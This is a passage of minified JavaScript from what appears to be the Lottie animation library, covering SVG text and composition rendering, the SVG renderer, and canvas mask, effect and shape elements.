                  this.globalData.fontManager.getFontByName(o.f).fFamily
                );
                var kt;
                if (wt.t === 1)
                  kt = new SVGCompElement(wt.data, this.globalData, this);
                else {
                  var Rt = emptyShapeData;
                  wt.data &&
                    wt.data.shapes &&
                    (Rt = this.buildShapeData(wt.data, o.finalSize)),
                    (kt = new SVGShapeElement(Rt, this.globalData, this));
                }
                if (this.textSpans[i].glyph) {
                  var It = this.textSpans[i].glyph;
                  this.textSpans[i].childSpan.removeChild(It.layerElement),
                    It.destroy();
                }
                (this.textSpans[i].glyph = kt),
                  (kt._debug = !0),
                  kt.prepareFrame(0),
                  kt.renderFrame(),
                  this.textSpans[i].childSpan.appendChild(kt.layerElement),
                  wt.t === 1 &&
                    this.textSpans[i].childSpan.setAttribute(
                      "transform",
                      "scale(" +
                        o.finalSize / 100 +
                        "," +
                        o.finalSize / 100 +
                        ")"
                    );
              } else
                St &&
                  ft.setAttribute(
                    "transform",
                    "translate(" + ht.props[12] + "," + ht.props[13] + ")"
                  ),
                  (ft.textContent = ot[i].val),
                  ft.setAttributeNS(
                    "http://www.w3.org/XML/1998/namespace",
                    "xml:space",
                    "preserve"
                  );
            }
            St && ft && ft.setAttribute("d", gt);
          }
          for (; i < this.textSpans.length; )
            (this.textSpans[i].span.style.display = "none"), (i += 1);
          this._sizeChanged = !0;
        }),
        (SVGTextLottieElement.prototype.sourceRectAtTime = function () {
          if (
            (this.prepareFrame(this.comp.renderedFrame - this.data.st),
            this.renderInnerContent(),
            this._sizeChanged)
          ) {
            this._sizeChanged = !1;
            var i = this.layerElement.getBBox();
            this.bbox = {
              top: i.y,
              left: i.x,
              width: i.width,
              height: i.height,
            };
          }
          return this.bbox;
        }),
        (SVGTextLottieElement.prototype.getValue = function () {
          var i,
            a = this.textSpans.length,
            o;
          for (
            this.renderedFrame = this.comp.renderedFrame, i = 0;
            i < a;
            i += 1
          )
            (o = this.textSpans[i].glyph),
              o &&
                (o.prepareFrame(this.comp.renderedFrame - this.data.st),
                o._mdf && (this._mdf = !0));
        }),
        (SVGTextLottieElement.prototype.renderInnerContent = function () {
          if (
            (this.validateText(),
            (!this.data.singleShape || this._mdf) &&
              (this.textAnimator.getMeasures(
                this.textProperty.currentData,
                this.lettersChangedFlag
              ),
              this.lettersChangedFlag || this.textAnimator.lettersChangedFlag))
          ) {
            this._sizeChanged = !0;
            var i,
              a,
              o = this.textAnimator.renderedLetters,
              s = this.textProperty.currentData.l;
            a = s.length;
            var tt, nt, ot;
            for (i = 0; i < a; i += 1)
              s[i].n ||
                ((tt = o[i]),
                (nt = this.textSpans[i].span),
                (ot = this.textSpans[i].glyph),
                ot && ot.renderFrame(),
                tt._mdf.m && nt.setAttribute("transform", tt.m),
                tt._mdf.o && nt.setAttribute("opacity", tt.o),
                tt._mdf.sw && nt.setAttribute("stroke-width", tt.sw),
                tt._mdf.sc && nt.setAttribute("stroke", tt.sc),
                tt._mdf.fc && nt.setAttribute("fill", tt.fc));
          }
        });
      function ISolidElement(i, a, o) {
        this.initElement(i, a, o);
      }
      extendPrototype([IImageElement], ISolidElement),
        (ISolidElement.prototype.createContent = function () {
          var i = createNS("rect");
          i.setAttribute("width", this.data.sw),
            i.setAttribute("height", this.data.sh),
            i.setAttribute("fill", this.data.sc),
            this.layerElement.appendChild(i);
        });
      function NullElement(i, a, o) {
        this.initFrame(),
          this.initBaseData(i, a, o),
          this.initFrame(),
          this.initTransform(i, a, o),
          this.initHierarchy();
      }
      (NullElement.prototype.prepareFrame = function (i) {
        this.prepareProperties(i, !0);
      }),
        (NullElement.prototype.renderFrame = function () {}),
        (NullElement.prototype.getBaseElement = function () {
          return null;
        }),
        (NullElement.prototype.destroy = function () {}),
        (NullElement.prototype.sourceRectAtTime = function () {}),
        (NullElement.prototype.hide = function () {}),
        extendPrototype(
          [BaseElement, TransformElement, HierarchyElement, FrameElement],
          NullElement
        );
      function SVGRendererBase() {}
      extendPrototype([BaseRenderer], SVGRendererBase),
        (SVGRendererBase.prototype.createNull = function (i) {
          return new NullElement(i, this.globalData, this);
        }),
        (SVGRendererBase.prototype.createShape = function (i) {
          return new SVGShapeElement(i, this.globalData, this);
        }),
        (SVGRendererBase.prototype.createText = function (i) {
          return new SVGTextLottieElement(i, this.globalData, this);
        }),
        (SVGRendererBase.prototype.createImage = function (i) {
          return new IImageElement(i, this.globalData, this);
        }),
        (SVGRendererBase.prototype.createSolid = function (i) {
          return new ISolidElement(i, this.globalData, this);
        }),
        (SVGRendererBase.prototype.configAnimation = function (i) {
          this.svgElement.setAttribute("xmlns", "http://www.w3.org/2000/svg"),
            this.svgElement.setAttribute(
              "xmlns:xlink",
              "http://www.w3.org/1999/xlink"
            ),
            this.renderConfig.viewBoxSize
              ? this.svgElement.setAttribute(
                  "viewBox",
                  this.renderConfig.viewBoxSize
                )
              : this.svgElement.setAttribute(
                  "viewBox",
                  "0 0 " + i.w + " " + i.h
                ),
            this.renderConfig.viewBoxOnly ||
              (this.svgElement.setAttribute("width", i.w),
              this.svgElement.setAttribute("height", i.h),
              (this.svgElement.style.width = "100%"),
              (this.svgElement.style.height = "100%"),
              (this.svgElement.style.transform = "translate3d(0,0,0)"),
              (this.svgElement.style.contentVisibility =
                this.renderConfig.contentVisibility)),
            this.renderConfig.width &&
              this.svgElement.setAttribute("width", this.renderConfig.width),
            this.renderConfig.height &&
              this.svgElement.setAttribute("height", this.renderConfig.height),
            this.renderConfig.className &&
              this.svgElement.setAttribute(
                "class",
                this.renderConfig.className
              ),
            this.renderConfig.id &&
              this.svgElement.setAttribute("id", this.renderConfig.id),
            this.renderConfig.focusable !== void 0 &&
              this.svgElement.setAttribute(
                "focusable",
                this.renderConfig.focusable
              ),
            this.svgElement.setAttribute(
              "preserveAspectRatio",
              this.renderConfig.preserveAspectRatio
            ),
            this.animationItem.wrapper.appendChild(this.svgElement);
          var a = this.globalData.defs;
          this.setupGlobalData(i, a),
            (this.globalData.progressiveLoad =
              this.renderConfig.progressiveLoad),
            (this.data = i);
          var o = createNS("clipPath"),
            s = createNS("rect");
          s.setAttribute("width", i.w),
            s.setAttribute("height", i.h),
            s.setAttribute("x", 0),
            s.setAttribute("y", 0);
          var tt = createElementID();
          o.setAttribute("id", tt),
            o.appendChild(s),
            this.layerElement.setAttribute(
              "clip-path",
              "url(" + getLocationHref() + "#" + tt + ")"
            ),
            a.appendChild(o),
            (this.layers = i.layers),
            (this.elements = createSizedArray(i.layers.length));
        }),
        (SVGRendererBase.prototype.destroy = function () {
          this.animationItem.wrapper &&
            (this.animationItem.wrapper.innerText = ""),
            (this.layerElement = null),
            (this.globalData.defs = null);
          var i,
            a = this.layers ? this.layers.length : 0;
          for (i = 0; i < a; i += 1)
            this.elements[i] &&
              this.elements[i].destroy &&
              this.elements[i].destroy();
          (this.elements.length = 0),
            (this.destroyed = !0),
            (this.animationItem = null);
        }),
        (SVGRendererBase.prototype.updateContainerSize = function () {}),
        (SVGRendererBase.prototype.findIndexByInd = function (i) {
          var a = 0,
            o = this.layers.length;
          for (a = 0; a < o; a += 1) if (this.layers[a].ind === i) return a;
          return -1;
        }),
        (SVGRendererBase.prototype.buildItem = function (i) {
          var a = this.elements;
          if (!(a[i] || this.layers[i].ty === 99)) {
            a[i] = !0;
            var o = this.createItem(this.layers[i]);
            if (
              ((a[i] = o),
              getExpressionsPlugin() &&
                (this.layers[i].ty === 0 &&
                  this.globalData.projectInterface.registerComposition(o),
                o.initExpressions()),
              this.appendElementInPos(o, i),
              this.layers[i].tt)
            ) {
              var s =
                "tp" in this.layers[i]
                  ? this.findIndexByInd(this.layers[i].tp)
                  : i - 1;
              if (s === -1) return;
              if (!this.elements[s] || this.elements[s] === !0)
                this.buildItem(s), this.addPendingElement(o);
              else {
                var tt = a[s],
                  nt = tt.getMatte(this.layers[i].tt);
                o.setMatte(nt);
              }
            }
          }
        }),
        (SVGRendererBase.prototype.checkPendingElements = function () {
          for (; this.pendingElements.length; ) {
            var i = this.pendingElements.pop();
            if ((i.checkParenting(), i.data.tt))
              for (var a = 0, o = this.elements.length; a < o; ) {
                if (this.elements[a] === i) {
                  var s =
                      "tp" in i.data ? this.findIndexByInd(i.data.tp) : a - 1,
                    tt = this.elements[s],
                    nt = tt.getMatte(this.layers[a].tt);
                  i.setMatte(nt);
                  break;
                }
                a += 1;
              }
          }
        }),
        (SVGRendererBase.prototype.renderFrame = function (i) {
          if (!(this.renderedFrame === i || this.destroyed)) {
            i === null ? (i = this.renderedFrame) : (this.renderedFrame = i),
              (this.globalData.frameNum = i),
              (this.globalData.frameId += 1),
              (this.globalData.projectInterface.currentFrame = i),
              (this.globalData._mdf = !1);
            var a,
              o = this.layers.length;
            for (
              this.completeLayers || this.checkLayers(i), a = o - 1;
              a >= 0;
              a -= 1
            )
              (this.completeLayers || this.elements[a]) &&
                this.elements[a].prepareFrame(i - this.layers[a].st);
            if (this.globalData._mdf)
              for (a = 0; a < o; a += 1)
                (this.completeLayers || this.elements[a]) &&
                  this.elements[a].renderFrame();
          }
        }),
        (SVGRendererBase.prototype.appendElementInPos = function (i, a) {
          var o = i.getBaseElement();
          if (o) {
            for (var s = 0, tt; s < a; )
              this.elements[s] &&
                this.elements[s] !== !0 &&
                this.elements[s].getBaseElement() &&
                (tt = this.elements[s].getBaseElement()),
                (s += 1);
            tt
              ? this.layerElement.insertBefore(o, tt)
              : this.layerElement.appendChild(o);
          }
        }),
        (SVGRendererBase.prototype.hide = function () {
          this.layerElement.style.display = "none";
        }),
        (SVGRendererBase.prototype.show = function () {
          this.layerElement.style.display = "block";
        });
      function ICompElement() {}
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
        ],
        ICompElement
      ),
        (ICompElement.prototype.initElement = function (i, a, o) {
          this.initFrame(),
            this.initBaseData(i, a, o),
            this.initTransform(i, a, o),
            this.initRenderable(),
            this.initHierarchy(),
            this.initRendererElement(),
            this.createContainerElements(),
            this.createRenderableComponents(),
            (this.data.xt || !a.progressiveLoad) && this.buildAllItems(),
            this.hide();
        }),
        (ICompElement.prototype.prepareFrame = function (i) {
          if (
            ((this._mdf = !1),
            this.prepareRenderableFrame(i),
            this.prepareProperties(i, this.isInRange),
            !(!this.isInRange && !this.data.xt))
          ) {
            if (this.tm._placeholder) this.renderedFrame = i / this.data.sr;
            else {
              var a = this.tm.v;
              a === this.data.op && (a = this.data.op - 1),
                (this.renderedFrame = a);
            }
            var o,
              s = this.elements.length;
            for (
              this.completeLayers || this.checkLayers(this.renderedFrame),
                o = s - 1;
              o >= 0;
              o -= 1
            )
              (this.completeLayers || this.elements[o]) &&
                (this.elements[o].prepareFrame(
                  this.renderedFrame - this.layers[o].st
                ),
                this.elements[o]._mdf && (this._mdf = !0));
          }
        }),
        (ICompElement.prototype.renderInnerContent = function () {
          var i,
            a = this.layers.length;
          for (i = 0; i < a; i += 1)
            (this.completeLayers || this.elements[i]) &&
              this.elements[i].renderFrame();
        }),
        (ICompElement.prototype.setElements = function (i) {
          this.elements = i;
        }),
        (ICompElement.prototype.getElements = function () {
          return this.elements;
        }),
        (ICompElement.prototype.destroyElements = function () {
          var i,
            a = this.layers.length;
          for (i = 0; i < a; i += 1)
            this.elements[i] && this.elements[i].destroy();
        }),
        (ICompElement.prototype.destroy = function () {
          this.destroyElements(), this.destroyBaseElement();
        });
      function SVGCompElement(i, a, o) {
        (this.layers = i.layers),
          (this.supports3d = !0),
          (this.completeLayers = !1),
          (this.pendingElements = []),
          (this.elements = this.layers
            ? createSizedArray(this.layers.length)
            : []),
          this.initElement(i, a, o),
          (this.tm = i.tm
            ? PropertyFactory.getProp(this, i.tm, 0, a.frameRate, this)
            : { _placeholder: !0 });
      }
      extendPrototype(
        [SVGRendererBase, ICompElement, SVGBaseElement],
        SVGCompElement
      ),
        (SVGCompElement.prototype.createComp = function (i) {
          return new SVGCompElement(i, this.globalData, this);
        });
      function SVGRenderer(i, a) {
        (this.animationItem = i),
          (this.layers = null),
          (this.renderedFrame = -1),
          (this.svgElement = createNS("svg"));
        var o = "";
        if (a && a.title) {
          var s = createNS("title"),
            tt = createElementID();
          s.setAttribute("id", tt),
            (s.textContent = a.title),
            this.svgElement.appendChild(s),
            (o += tt);
        }
        if (a && a.description) {
          var nt = createNS("desc"),
            ot = createElementID();
          nt.setAttribute("id", ot),
            (nt.textContent = a.description),
            this.svgElement.appendChild(nt),
            (o += " " + ot);
        }
        o && this.svgElement.setAttribute("aria-labelledby", o);
        var st = createNS("defs");
        this.svgElement.appendChild(st);
        var ft = createNS("g");
        this.svgElement.appendChild(ft),
          (this.layerElement = ft),
          (this.renderConfig = {
            preserveAspectRatio:
              (a && a.preserveAspectRatio) || "xMidYMid meet",
            imagePreserveAspectRatio:
              (a && a.imagePreserveAspectRatio) || "xMidYMid slice",
            contentVisibility: (a && a.contentVisibility) || "visible",
            progressiveLoad: (a && a.progressiveLoad) || !1,
            hideOnTransparent: !(a && a.hideOnTransparent === !1),
            viewBoxOnly: (a && a.viewBoxOnly) || !1,
            viewBoxSize: (a && a.viewBoxSize) || !1,
            className: (a && a.className) || "",
            id: (a && a.id) || "",
            focusable: a && a.focusable,
            filterSize: {
              width: (a && a.filterSize && a.filterSize.width) || "100%",
              height: (a && a.filterSize && a.filterSize.height) || "100%",
              x: (a && a.filterSize && a.filterSize.x) || "0%",
              y: (a && a.filterSize && a.filterSize.y) || "0%",
            },
            width: a && a.width,
            height: a && a.height,
            runExpressions:
              !a || a.runExpressions === void 0 || a.runExpressions,
          }),
          (this.globalData = {
            _mdf: !1,
            frameNum: -1,
            defs: st,
            renderConfig: this.renderConfig,
          }),
          (this.elements = []),
          (this.pendingElements = []),
          (this.destroyed = !1),
          (this.rendererType = "svg");
      }
      extendPrototype([SVGRendererBase], SVGRenderer),
        (SVGRenderer.prototype.createComp = function (i) {
          return new SVGCompElement(i, this.globalData, this);
        });
      function ShapeTransformManager() {
        (this.sequences = {}),
          (this.sequenceList = []),
          (this.transform_key_count = 0);
      }
      ShapeTransformManager.prototype = {
        addTransformSequence: function (a) {
          var o,
            s = a.length,
            tt = "_";
          for (o = 0; o < s; o += 1) tt += a[o].transform.key + "_";
          var nt = this.sequences[tt];
          return (
            nt ||
              ((nt = {
                transforms: [].concat(a),
                finalTransform: new Matrix(),
                _mdf: !1,
              }),
              (this.sequences[tt] = nt),
              this.sequenceList.push(nt)),
            nt
          );
        },
        processSequence: function (a, o) {
          for (var s = 0, tt = a.transforms.length, nt = o; s < tt && !o; ) {
            if (a.transforms[s].transform.mProps._mdf) {
              nt = !0;
              break;
            }
            s += 1;
          }
          if (nt)
            for (a.finalTransform.reset(), s = tt - 1; s >= 0; s -= 1)
              a.finalTransform.multiply(a.transforms[s].transform.mProps.v);
          a._mdf = nt;
        },
        processSequences: function (a) {
          var o,
            s = this.sequenceList.length;
          for (o = 0; o < s; o += 1)
            this.processSequence(this.sequenceList[o], a);
        },
        getNewKey: function () {
          return (
            (this.transform_key_count += 1), "_" + this.transform_key_count
          );
        },
      };
      var lumaLoader = function () {
        var a = "__lottie_element_luma_buffer",
          o = null,
          s = null,
          tt = null;
        function nt() {
          var ft = createNS("svg"),
            ht = createNS("filter"),
            gt = createNS("feColorMatrix");
          return (
            ht.setAttribute("id", a),
            gt.setAttribute("type", "matrix"),
            gt.setAttribute("color-interpolation-filters", "sRGB"),
            gt.setAttribute(
              "values",
              "0.3, 0.3, 0.3, 0, 0, 0.3, 0.3, 0.3, 0, 0, 0.3, 0.3, 0.3, 0, 0, 0.3, 0.3, 0.3, 0, 0"
            ),
            ht.appendChild(gt),
            ft.appendChild(ht),
            ft.setAttribute("id", a + "_svg"),
            featureSupport.svgLumaHidden && (ft.style.display = "none"),
            ft
          );
        }
        function ot() {
          o ||
            ((tt = nt()),
            document.body.appendChild(tt),
            (o = createTag("canvas")),
            (s = o.getContext("2d")),
            (s.filter = "url(#" + a + ")"),
            (s.fillStyle = "rgba(0,0,0,0)"),
            s.fillRect(0, 0, 1, 1));
        }
        function st(ft) {
          return (
            o || ot(),
            (o.width = ft.width),
            (o.height = ft.height),
            (s.filter = "url(#" + a + ")"),
            o
          );
        }
        return { load: ot, get: st };
      };
      function createCanvas(i, a) {
        if (featureSupport.offscreenCanvas) return new OffscreenCanvas(i, a);
        var o = createTag("canvas");
        return (o.width = i), (o.height = a), o;
      }
      var assetLoader = (function () {
          return {
            loadLumaCanvas: lumaLoader.load,
            getLumaCanvas: lumaLoader.get,
            createCanvas,
          };
        })(),
        registeredEffects = {};
      function CVEffects(i) {
        var a,
          o = i.data.ef ? i.data.ef.length : 0;
        this.filters = [];
        var s;
        for (a = 0; a < o; a += 1) {
          s = null;
          var tt = i.data.ef[a].ty;
          if (registeredEffects[tt]) {
            var nt = registeredEffects[tt].effect;
            s = new nt(i.effectsManager.effectElements[a], i);
          }
          s && this.filters.push(s);
        }
        this.filters.length && i.addRenderableComponent(this);
      }
      (CVEffects.prototype.renderFrame = function (i) {
        var a,
          o = this.filters.length;
        for (a = 0; a < o; a += 1) this.filters[a].renderFrame(i);
      }),
        (CVEffects.prototype.getEffects = function (i) {
          var a,
            o = this.filters.length,
            s = [];
          for (a = 0; a < o; a += 1)
            this.filters[a].type === i && s.push(this.filters[a]);
          return s;
        });
      function registerEffect(i, a) {
        registeredEffects[i] = { effect: a };
      }
      function CVMaskElement(i, a) {
        (this.data = i),
          (this.element = a),
          (this.masksProperties = this.data.masksProperties || []),
          (this.viewData = createSizedArray(this.masksProperties.length));
        var o,
          s = this.masksProperties.length,
          tt = !1;
        for (o = 0; o < s; o += 1)
          this.masksProperties[o].mode !== "n" && (tt = !0),
            (this.viewData[o] = ShapePropertyFactory.getShapeProp(
              this.element,
              this.masksProperties[o],
              3
            ));
        (this.hasMasks = tt), tt && this.element.addRenderableComponent(this);
      }
      (CVMaskElement.prototype.renderFrame = function () {
        if (this.hasMasks) {
          var i = this.element.finalTransform.mat,
            a = this.element.canvasContext,
            o,
            s = this.masksProperties.length,
            tt,
            nt,
            ot;
          for (a.beginPath(), o = 0; o < s; o += 1)
            if (this.masksProperties[o].mode !== "n") {
              this.masksProperties[o].inv &&
                (a.moveTo(0, 0),
                a.lineTo(this.element.globalData.compSize.w, 0),
                a.lineTo(
                  this.element.globalData.compSize.w,
                  this.element.globalData.compSize.h
                ),
                a.lineTo(0, this.element.globalData.compSize.h),
                a.lineTo(0, 0)),
                (ot = this.viewData[o].v),
                (tt = i.applyToPointArray(ot.v[0][0], ot.v[0][1], 0)),
                a.moveTo(tt[0], tt[1]);
              var st,
                ft = ot._length;
              for (st = 1; st < ft; st += 1)
                (nt = i.applyToTriplePoints(ot.o[st - 1], ot.i[st], ot.v[st])),
                  a.bezierCurveTo(nt[0], nt[1], nt[2], nt[3], nt[4], nt[5]);
              (nt = i.applyToTriplePoints(ot.o[st - 1], ot.i[0], ot.v[0])),
                a.bezierCurveTo(nt[0], nt[1], nt[2], nt[3], nt[4], nt[5]);
            }
          this.element.globalData.renderer.save(!0), a.clip();
        }
      }),
        (CVMaskElement.prototype.getMaskProperty =
          MaskElement.prototype.getMaskProperty),
        (CVMaskElement.prototype.destroy = function () {
          this.element = null;
        });
      function CVBaseElement() {}
      var operationsMap = {
        1: "source-in",
        2: "source-out",
        3: "source-in",
        4: "source-out",
      };
      (CVBaseElement.prototype = {
        createElements: function () {},
        initRendererElement: function () {},
        createContainerElements: function () {
          if (this.data.tt >= 1) {
            this.buffers = [];
            var a = this.globalData.canvasContext,
              o = assetLoader.createCanvas(a.canvas.width, a.canvas.height);
            this.buffers.push(o);
            var s = assetLoader.createCanvas(a.canvas.width, a.canvas.height);
            this.buffers.push(s),
              this.data.tt >= 3 &&
                !document._isProxy &&
                assetLoader.loadLumaCanvas();
          }
          (this.canvasContext = this.globalData.canvasContext),
            (this.transformCanvas = this.globalData.transformCanvas),
            (this.renderableEffectsManager = new CVEffects(this)),
            this.searchEffectTransforms();
        },
        createContent: function () {},
        setBlendMode: function () {
          var a = this.globalData;
          if (a.blendMode !== this.data.bm) {
            a.blendMode = this.data.bm;
            var o = getBlendMode(this.data.bm);
            a.canvasContext.globalCompositeOperation = o;
          }
        },
        createRenderableComponents: function () {
          (this.maskManager = new CVMaskElement(this.data, this)),
            (this.transformEffects = this.renderableEffectsManager.getEffects(
              effectTypes.TRANSFORM_EFFECT
            ));
        },
        hideElement: function () {
          !this.hidden &&
            (!this.isInRange || this.isTransparent) &&
            (this.hidden = !0);
        },
        showElement: function () {
          this.isInRange &&
            !this.isTransparent &&
            ((this.hidden = !1),
            (this._isFirstFrame = !0),
            (this.maskManager._isFirstFrame = !0));
        },
        clearCanvas: function (a) {
          a.clearRect(
            this.transformCanvas.tx,
            this.transformCanvas.ty,
            this.transformCanvas.w * this.transformCanvas.sx,
            this.transformCanvas.h * this.transformCanvas.sy
          );
        },
        prepareLayer: function () {
          if (this.data.tt >= 1) {
            var a = this.buffers[0],
              o = a.getContext("2d");
            this.clearCanvas(o),
              o.drawImage(this.canvasContext.canvas, 0, 0),
              (this.currentTransform = this.canvasContext.getTransform()),
              this.canvasContext.setTransform(1, 0, 0, 1, 0, 0),
              this.clearCanvas(this.canvasContext),
              this.canvasContext.setTransform(this.currentTransform);
          }
        },
        exitLayer: function () {
          if (this.data.tt >= 1) {
            var a = this.buffers[1],
              o = a.getContext("2d");
            this.clearCanvas(o),
              o.drawImage(this.canvasContext.canvas, 0, 0),
              this.canvasContext.setTransform(1, 0, 0, 1, 0, 0),
              this.clearCanvas(this.canvasContext),
              this.canvasContext.setTransform(this.currentTransform);
            var s = this.comp.getElementById(
              "tp" in this.data ? this.data.tp : this.data.ind - 1
            );
            if (
              (s.renderFrame(!0),
              this.canvasContext.setTransform(1, 0, 0, 1, 0, 0),
              this.data.tt >= 3 && !document._isProxy)
            ) {
              var tt = assetLoader.getLumaCanvas(this.canvasContext.canvas),
                nt = tt.getContext("2d");
              nt.drawImage(this.canvasContext.canvas, 0, 0),
                this.clearCanvas(this.canvasContext),
                this.canvasContext.drawImage(tt, 0, 0);
            }
            (this.canvasContext.globalCompositeOperation =
              operationsMap[this.data.tt]),
              this.canvasContext.drawImage(a, 0, 0),
              (this.canvasContext.globalCompositeOperation =
                "destination-over"),
              this.canvasContext.drawImage(this.buffers[0], 0, 0),
              this.canvasContext.setTransform(this.currentTransform),
              (this.canvasContext.globalCompositeOperation = "source-over");
          }
        },
        renderFrame: function (a) {
          if (!(this.hidden || this.data.hd) && !(this.data.td === 1 && !a)) {
            this.renderTransform(),
              this.renderRenderable(),
              this.renderLocalTransform(),
              this.setBlendMode();
            var o = this.data.ty === 0;
            this.prepareLayer(),
              this.globalData.renderer.save(o),
              this.globalData.renderer.ctxTransform(
                this.finalTransform.localMat.props
              ),
              this.globalData.renderer.ctxOpacity(
                this.finalTransform.localOpacity
              ),
              this.renderInnerContent(),
              this.globalData.renderer.restore(o),
              this.exitLayer(),
              this.maskManager.hasMasks && this.globalData.renderer.restore(!0),
              this._isFirstFrame && (this._isFirstFrame = !1);
          }
        },
        destroy: function () {
          (this.canvasContext = null),
            (this.data = null),
            (this.globalData = null),
            this.maskManager.destroy();
        },
        mHelper: new Matrix(),
      }),
        (CVBaseElement.prototype.hide = CVBaseElement.prototype.hideElement),
        (CVBaseElement.prototype.show = CVBaseElement.prototype.showElement);
      function CVShapeData(i, a, o, s) {
        (this.styledShapes = []), (this.tr = [0, 0, 0, 0, 0, 0]);
        var tt = 4;
        a.ty === "rc"
          ? (tt = 5)
          : a.ty === "el"
          ? (tt = 6)
          : a.ty === "sr" && (tt = 7),
          (this.sh = ShapePropertyFactory.getShapeProp(i, a, tt, i));
        var nt,
          ot = o.length,
          st;
        for (nt = 0; nt < ot; nt += 1)
          o[nt].closed ||
            ((st = {
              transforms: s.addTransformSequence(o[nt].transforms),
              trNodes: [],
            }),
            this.styledShapes.push(st),
            o[nt].elements.push(st));
      }
      CVShapeData.prototype.setAsAnimated =
        SVGShapeData.prototype.setAsAnimated;
      function CVShapeElement(i, a, o) {
        (this.shapes = []),
          (this.shapesData = i.shapes),
          (this.stylesList = []),
          (this.itemsData = []),
          (this.prevViewData = []),
          (this.shapeModifiers = []),
          (this.processedElements = []),
          (this.transformsManager = new ShapeTransformManager()),
          this.initElement(i, a, o);
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          CVBaseElement,
          IShapeElement,
          HierarchyElement,
          FrameElement,
          RenderableElement,
        ],
        CVShapeElement
      ),
        (CVShapeElement.prototype.initElement =
          RenderableDOMElement.prototype.initElement),
        (CVShapeElement.prototype.transformHelper = { opacity: 1, _opMdf: !1 }),
        (CVShapeElement.prototype.dashResetter = []),
        (CVShapeElement.prototype.createContent = function () {
          this.searchShapes(
            this.shapesData,
            this.itemsData,
            this.prevViewData,
            !0,
            []
          );
        }),
        (CVShapeElement.prototype.createStyleElement = function (i, a) {
          var o = {
              data: i,
              type: i.ty,
              preTransforms: this.transformsManager.addTransformSequence(a),
              transforms: [],
              elements: [],
              closed: i.hd === !0,
            },
            s = {};
          if (
            (i.ty === "fl" || i.ty === "st"
              ? ((s.c = PropertyFactory.getProp(this, i.c, 1, 255, this)),
                s.c.k ||
                  (o.co =
                    "rgb(" +
                    bmFloor(s.c.v[0]) +
                    "," +
                    bmFloor(s.c.v[1]) +
                    "," +
                    bmFloor(s.c.v[2]) +
                    ")"))
              : (i.ty === "gf" || i.ty === "gs") &&
                ((s.s = PropertyFactory.getProp(this, i.s, 1, null, this)),
                (s.e = PropertyFactory.getProp(this, i.e, 1, null, this)),
                (s.h = PropertyFactory.getProp(
                  this,
                  i.h || { k: 0 },
                  0,
                  0.01,
                  this
                )),
                (s.a = PropertyFactory.getProp(
                  this,
                  i.a || { k: 0 },
                  0,
                  degToRads,
                  this
                )),
                (s.g = new GradientProperty(this, i.g, this))),
            (s.o = PropertyFactory.getProp(this, i.o, 0, 0.01, this)),
            i.ty === "st" || i.ty === "gs")
          ) {
            if (
              ((o.lc = lineCapEnum[i.lc || 2]),
              (o.lj = lineJoinEnum[i.lj || 2]),
              i.lj == 1 && (o.ml = i.ml),
              (s.w = PropertyFactory.getProp(this, i.w, 0, null, this)),
              s.w.k || (o.wi = s.w.v),
              i.d)
            ) {
              var tt = new DashProperty(this, i.d, "canvas", this);
              (s.d = tt),
                s.d.k || ((o.da = s.d.dashArray), (o.do = s.d.dashoffset[0]));
            }
          } else o.r = i.r === 2 ? "evenodd" : "nonzero";
          return this.stylesList.push(o), (s.style = o), s;
        }),
        (CVShapeElement.prototype.createGroupElement = function () {
          var i = { it: [], prevViewData: [] };
          return i;
        }),
        (CVShapeElement.prototype.createTransformElement = function (i) {
          var a = {
            transform: {
              opacity: 1,
              _opMdf: !1,
              key: this.transformsManager.getNewKey(),
              op: PropertyFactory.getProp(this, i.o, 0, 0.01, this),
              mProps: TransformPropertyFactory.getTransformProperty(
                this,
                i,
                this
              ),
            },
          };
          return a;
        }),
        (CVShapeElement.prototype.createShapeElement = function (i) {
          var a = new CVShapeData(
            this,
            i,
            this.stylesList,
            this.transformsManager
          );
          return this.shapes.push(a), this.addShapeToModifiers(a), a;
        }),
        (CVShapeElement.prototype.reloadShapes = function () {
          this._isFirstFrame = !0;
          var i,
            a = this.itemsData.length;
          for (i = 0; i < a; i += 1) this.prevViewData[i] = this.itemsData[i];
          for (
            this.searchShapes(
              this.shapesData,
              this.itemsData,
              this.prevViewData,
              !0,
              []
            ),
              a = this.dynamicProperties.length,
              i = 0;
            i < a;
            i += 1
          )
            this.dynamicProperties[i].getValue();
          this.renderModifiers(),
            this.transformsManager.processSequences(this._isFirstFrame);
        }),
        (CVShapeElement.prototype.addTransformToStyleList = function (i) {
          var a,
            o = this.stylesList.length;
          for (a = 0; a < o; a += 1)
            this.stylesList[a].closed || this.stylesList[a].transforms.push(i);
        }),
        (CVShapeElement.prototype.removeTransformFromStyleList = function () {
          var i,
            a = this.stylesList.length;
          for (i = 0; i < a; i += 1)
            this.stylesList[i].closed || this.stylesList[i].transforms.pop();
        }),
        (CVShapeElement.prototype.closeStyles = function (i) {
          var a,
            o = i.length;
          for (a = 0; a < o; a += 1) i[a].closed = !0;
        }),
        (CVShapeElement.prototype.searchShapes = function (i, a, o, s, tt) {
          var nt,
            ot = i.length - 1,
            st,
            ft,
            ht = [],
            gt = [],
            St,
            vt,
            _t,
            Et = [].concat(tt);
          for (nt = ot; nt >= 0; nt -= 1) {
            if (
              ((St = this.searchProcessedElement(i[nt])),
              St ? (a[nt] = o[St - 1]) : (i[nt]._shouldRender = s),
              i[nt].ty === "fl" ||
                i[nt].ty === "st" ||
                i[nt].ty === "gf" ||
                i[nt].ty === "gs")
            )
              St
                ? (a[nt].style.closed = !1)
                : (a[nt] = this.createStyleElement(i[nt], Et)),
                ht.push(a[nt].style);
            else if (i[nt].ty === "gr") {
              if (!St) a[nt] = this.createGroupElement(i[nt]);
              else
                for (ft = a[nt].it.length, st = 0; st < ft; st += 1)
                  a[nt].prevViewData[st] = a[nt].it[st];
              this.searchShapes(i[nt].it, a[nt].it, a[nt].prevViewData, s, Et);
            } else
              i[nt].ty === "tr"
                ? (St ||
                    ((_t = this.createTransformElement(i[nt])), (a[nt] = _t)),
                  Et.push(a[nt]),
                  this.addTransformToStyleList(a[nt]))
                : i[nt].ty === "sh" ||
                  i[nt].ty === "rc" ||
                  i[nt].ty === "el" ||
                  i[nt].ty === "sr"
                ? St || (a[nt] = this.createShapeElement(i[nt]))
                : i[nt].ty === "tm" ||
                  i[nt].ty === "rd" ||
                  i[nt].ty === "pb" ||
                  i[nt].ty === "zz" ||
                  i[nt].ty === "op"
                ? (St
                    ? ((vt = a[nt]), (vt.closed = !1))
